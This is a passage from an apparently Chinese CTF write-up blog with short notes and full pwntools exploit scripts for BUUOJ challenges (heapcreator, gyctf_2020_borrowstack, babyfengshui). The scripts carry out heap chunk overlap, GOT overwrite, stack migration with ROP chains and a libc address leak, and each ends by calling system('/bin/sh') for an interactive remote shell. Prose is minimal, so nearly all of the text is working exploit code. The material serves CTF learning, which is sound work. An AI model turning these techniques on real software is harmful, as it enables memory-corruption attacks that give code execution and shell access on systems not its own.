string\">'heapcreator'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#libdir = ''</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#libc = ELF(libdir + 'libc-2.23.so')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25016</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *0x4008f8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Your choice :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Size of Heap : '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content of heap:'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content of heap : '</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content : '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">headchunk</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> dest<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        self<span class=\"token punctuation\">.</span>dest <span class=\"token operator\">=</span> dest</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        self<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> size</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">out</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token number\">0x10</span><span class=\"token operator\">*</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x21</span><span class=\"token punctuation\">,</span>self<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">,</span>self<span class=\"token punctuation\">.</span>dest<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">return</span> payload</pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>heaparray <span class=\"token operator\">=</span> <span class=\"token number\">0x6020a0</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>free_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'fh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x58</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'uc'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'fh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x58</span> <span class=\"token operator\">+</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'ffff'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#0 h0 -> h2 -c- r2</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'ffff'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#2 r2 -> r0</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>ch <span class=\"token operator\">=</span> headchunk <span class=\"token punctuation\">(</span>free_g<span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> ch<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>free_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>libcs <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">,</span> free_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>libcbase <span class=\"token operator\">=</span> free_a <span class=\"token operator\">-</span> libcs<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libcs<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"gyctf_2020_borrowstack\"><a class=\"markdownIt-Anchor\" href=\"#gyctf_2020_borrowstack\">#</a> gyctf_2020_borrowstack</h2>\n<p>stack_migration</p>\n<p>程序给定了栈溢出的地址和对应的两个读取函数。</p>\n<p>用老方法，迁移后，泄露 libc 地址，然后构造 <code>system(&quot;/bin/sh&quot;);</code> 。</p>\n<p>由于程序给予的溢出地址过于接近 got 表及其他数据，在执行 system 时栈增长过长会破坏运行所需数据。因此第二次将栈迁移至 <code>0x601800</code>  处。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./gyctf_2020_borrowstack'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./gyctf_2020_borrowstack_pe')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29693</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b *0x400626')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>read_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>main_a <span class=\"token operator\">=</span> <span class=\"token number\">0x0400680</span> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x0601080</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>target2 <span class=\"token operator\">=</span> <span class=\"token number\">0x0601800</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x60</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>rdi_ret<span class=\"token operator\">=</span><span class=\"token number\">0x400703</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>rsi_r15<span class=\"token operator\">=</span><span class=\"token number\">0x400701</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>leave_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x400699</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x4004c9</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>leave_ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'what you want'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'now!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>payload <span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span>target2<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token operator\">+</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>rdi_ret<span class=\"token punctuation\">,</span> lsm_g<span class=\"token punctuation\">,</span> puts_p<span class=\"token punctuation\">,</span> rdi_ret<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> rsi_r15<span class=\"token punctuation\">,</span> target2<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> read_p<span class=\"token punctuation\">,</span> leave_ret<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x0a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'libc_start_main '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>lsm_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>  p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>bs_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"41\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"babyfengshui_33c3_2016\"><a class=\"markdownIt-Anchor\" href=\"#babyfengshui_33c3_2016\">#</a> babyfengshui_33c3_2016</h2>\n<p>overlap</p>\n<p>head chunk</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'babyfengshui_33c3_2016'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libdir <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libdir <span class=\"token operator\">+</span> <span class=\"token string\">'libc-2.23.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28175</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *0x08048AC0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token 